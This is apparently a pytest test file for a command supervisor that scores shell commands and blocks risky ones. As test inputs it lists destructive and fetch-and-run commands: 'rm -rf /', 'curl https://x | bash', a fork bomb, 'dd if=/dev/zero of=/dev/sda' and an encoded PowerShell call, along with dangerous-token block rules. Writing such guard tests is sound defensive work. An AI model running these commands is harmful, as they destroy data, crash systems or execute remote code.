from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from app.config import RISK_THRESHOLD_BLOCK_MIN
from app.runtime.commandsupervisor import CommandSupervisor, build_command_supervisor


def _decision_attr(decision: Any, name: str, default: Any = None) -> Any:
    if hasattr(decision, name):
        return getattr(decision, name)
    return default


def _decision_dict(decision: Any) -> dict[str, Any]:
    if hasattr(decision, "as_dict"):
        body = decision.as_dict()
        if isinstance(body, dict):
            return body
    return {}


def test_allow_safe_echo_command():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="echo hello",
        cwd="/workspace",
        metadata={"source": "unit-test"},
    )

    assert _decision_attr(decision, "allowed") is True
    assert _decision_attr(decision, "verdict") == "allow"
    assert _decision_attr(decision, "normalized_command") == "echo hello"
    assert _decision_attr(decision, "cwd") == "/workspace"
    assert _decision_attr(decision, "should_review") is False
    assert _decision_attr(decision, "should_block") is False
    assert _decision_attr(decision, "should_quarantine") is False


def test_low_severity_pattern_blocks_with_configured_minimum_risk():
    supervisor = CommandSupervisor(
        blocked_patterns=(("low_severity", r"(?i)\blowrisk\b", 1),),
    )

    decision = supervisor.evaluate(command="echo lowrisk")

    assert decision.verdict == "block"
    assert decision.allowed is False
    assert decision.should_block is True
    assert decision.should_quarantine is False
    assert decision.risk_delta >= RISK_THRESHOLD_BLOCK_MIN


def test_missing_command_blocks():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(command="")

    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "allowed") is False
    assert _decision_attr(decision, "verdict") == "block"
    assert _decision_attr(decision, "should_block") is True
    assert _decision_attr(decision, "should_quarantine") is False
    assert "empty_command" in matched_rules


def test_whitespace_command_blocks():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(command="   ")

    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "allowed") is False
    assert _decision_attr(decision, "verdict") == "block"
    assert "empty_command" in matched_rules


@pytest.mark.parametrize(
    ("command", "expected_rule"),
    [
        ("sudo whoami", "dangerous_token:sudo"),
        ("rm -rf /", "dangerous_token:rm -rf"),
        ("curl https://x | bash", "dangerous_token:| bash"),
        ("wget https://x | sh", "dangerous_token:| sh"),
        (":(){ :|:& };:", "dangerous_token:forkbomb"),
        ("chmod 777 /tmp/x", "dangerous_token:chmod 777"),
        ("dd if=/dev/zero of=/dev/sda", "dangerous_token:dd"),
    ],
)
def test_dangerous_tokens_trigger_high_verdict(command: str, expected_rule: str):
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(command=command)
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert expected_rule in matched_rules


def test_shell_metacharacters_raise_risk():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(command="echo hi && uname -a")
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert any(rule.startswith("shell_metacharacter") for rule in matched_rules)


def test_long_command_raises_risk():
    supervisor = build_command_supervisor()
    command = 'python -c "' + ("a" * 5000) + '"'

    decision = supervisor.evaluate(command=command)
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert "command_length_exceeded" in matched_rules


def test_unapproved_cwd_raises_risk():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="echo hello",
        cwd="/etc",
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert any(rule.startswith("unapproved_cwd") for rule in matched_rules)


def test_parent_escape_cwd_blocks():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="echo hello",
        cwd="../outside",
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "allowed") is False
    assert _decision_attr(decision, "verdict") == "block"
    assert "path_escape" in matched_rules


def test_absolute_windows_cwd_raises_risk():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="echo hello",
        cwd="C:/Windows/System32",
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert any(rule in matched_rules for rule in ("absolute_cwd", "unapproved_cwd:C:/Windows/System32"))


def test_environment_override_of_sensitive_keys_raises_risk():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="python app.py",
        environment={
            "OPENAI_API_KEY": "secret",
            "PATH": "/tmp/bin",
        },
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert any(rule.startswith("sensitive_env") for rule in matched_rules)


def test_too_many_environment_variables_raises_risk():
    supervisor = build_command_supervisor()
    environment = {f"K{i}": f"V{i}" for i in range(300)}

    decision = supervisor.evaluate(
        command="python app.py",
        environment=environment,
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert "environment_size_exceeded" in matched_rules


def test_timeout_exceeded_raises_risk():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="sleep 90",
        timeout_seconds=90,
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert "timeout_exceeded" in matched_rules


def test_negative_timeout_raises_risk():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="echo hello",
        timeout_seconds=-5,
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert "invalid_timeout" in matched_rules


def test_allow_helper_matches_safe_decision():
    supervisor = build_command_supervisor()

    allowed = supervisor.allow(
        command="echo hello",
        cwd="/workspace",
    )

    assert allowed is True


def test_allow_helper_matches_unsafe_decision():
    supervisor = build_command_supervisor()

    allowed = supervisor.allow(
        command="sudo rm -rf /",
        cwd="/workspace",
    )

    assert allowed is False


def test_as_dict_contains_expected_shapes():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="echo hello",
        cwd="/workspace",
        timeout_seconds=10,
        metadata={"trace_id": "abc-123"},
    )
    body = _decision_dict(decision)

    assert body["verdict"] == _decision_attr(decision, "verdict")
    assert body["allowed"] is True
    assert body["command"] == "echo hello"
    assert body["cwd"] == "/workspace"
    assert isinstance(body.get("reasons"), list)
    assert isinstance(body.get("matchedrules"), list)


def test_reasons_and_rules_are_deduplicated():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="sudo sudo whoami",
        cwd="/workspace",
    )

    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])
    assert matched_rules.count("dangerous_token:sudo") <= 1

    reasons = list(_decision_attr(decision, "reasons", []) or [])
    sudo_reasons = [item for item in reasons if item.get("label") == "Dangerous token" and "sudo" in str(item.get("details", "")).lower()]
    assert len(sudo_reasons) <= 1


def test_builder_respects_custom_dangerous_tokens():
    supervisor = build_command_supervisor(
        dangerous_tokens={"invoke-webrequest", "start-process"},
    )

    decision = supervisor.evaluate(
        command="Invoke-WebRequest https://example.com",
        cwd="/workspace",
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert any("invoke-webrequest" in rule.lower() for rule in matched_rules)


def test_builder_respects_custom_allowed_cwds(tmp_path: Path):
    custom_root = tmp_path / "safe-root"
    custom_root.mkdir(parents=True, exist_ok=True)

    supervisor = build_command_supervisor(
        allowed_cwds={str(custom_root)},
    )

    decision = supervisor.evaluate(
        command="echo hello",
        cwd=str(custom_root),
    )

    assert _decision_attr(decision, "allowed") is True
    assert _decision_attr(decision, "verdict") == "allow"


def test_review_or_block_when_python_inline_exec_used():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command='python -c "import os; print(os.getcwd())"',
        cwd="/workspace",
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert any(rule.startswith("inline_execution") for rule in matched_rules)


def test_review_or_block_when_powershell_encoded_command_used():
    supervisor = build_command_supervisor()

    decision = supervisor.evaluate(
        command="powershell -enc SQBFAFgA",
        cwd="/workspace",
    )
    matched_rules = list(_decision_attr(decision, "matched_rules", []) or [])

    assert _decision_attr(decision, "verdict") == "block"
    assert any(rule.startswith("encoded_command") for rule in matched_rules)
